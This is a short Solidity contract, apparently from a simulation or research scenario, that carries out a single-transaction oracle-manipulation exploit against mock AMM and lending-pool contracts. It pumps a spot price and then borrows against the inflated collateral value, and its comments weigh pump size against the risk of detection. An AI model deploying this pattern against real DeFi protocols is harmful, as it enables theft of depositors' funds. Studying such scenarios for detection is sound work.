// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {MockAMM} from "./MockAMM.sol";
import {LendingPool} from "./LendingPool.sol";

/// @title OracleManipAttacker — Scenario 02 exploit, parameterized by pump size.
/// @notice In a single transaction: pump the AMM spot price by swapping `pumpEth`
///         in, then borrow against collateral now valued at the inflated price.
///         `pumpEth` is the attacker's strategy knob: large == blatant/profitable
///         but easy to flag; small == stealthy but low yield (and, at organic-
///         volatility magnitudes, indistinguishable from honest price movement).
contract OracleManipAttacker {
    function attack(MockAMM amm, LendingPool pool, uint256 pumpEth, uint256 collateral) external {
        amm.swapEthForTok(pumpEth); // manipulate spot price upward
        pool.depositCollateral(address(this), collateral);
        uint256 price = amm.spotPrice();
        uint256 maxBorrow = (((collateral * price) / 1e18) * pool.LTV()) / 100;
        pool.borrow(maxBorrow); // borrow against the inflated valuation
    }
}
